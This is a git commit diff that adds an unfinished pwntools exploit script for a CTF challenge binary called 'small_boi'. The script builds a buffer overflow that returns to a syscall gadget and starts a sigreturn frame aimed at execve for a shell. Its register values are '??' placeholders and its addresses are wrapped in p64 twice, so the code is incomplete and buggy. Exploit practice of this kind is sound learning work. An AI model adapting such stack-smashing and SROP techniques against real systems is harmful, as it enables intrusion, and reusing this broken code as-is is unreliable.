24e5749f3fd2ddb8f87a16860ee95131af81a18a
Malachi Parks <Malachiparks1999@gmail.com>
2022-03-22 02:26:34 -0400

    Stack Genration in progress

--- PCPs/Pacecar18/answer.py
+++ PCPs/Pacecar18/answer.py
@@ -22,3 +22,40 @@ Useful Funcs
 
 # Import Libaries
 from pwn import *
+
+# set context for frame creation
+context.arch="amd64"
+
+# Variables
+padding=b'a'*32
+padOverBP=b'a'*8
+systemCall = p64(0x0000000000400185)
+shell = p64(0x004001ca)
+
+# Generate ELF
+elf = ELF("./small_boi", checksec=False)
+
+# Start a process!
+p=process("./small_boi")
+
+# setup stack!
+payload = padding
+payload += padOverBP 
+payload += p64(systemCall)  # Generate a system call
+payload += p64(0xf) #syscall 0xf is sigreturn
+
+# Send first payload to generate stack
+p.sendline(payload)
+
+# Stack generation
+frame = SigreturnFrame()
+frame.rax = 59
+frame.rsp = ??
+frame.rbp = ??
+frame.rdi = ??
+frame.rsi = ??
+frame.rdx = ??
+frame.rip = ??
+
+# Craft payload 2
+payload2 = bytes(frame)
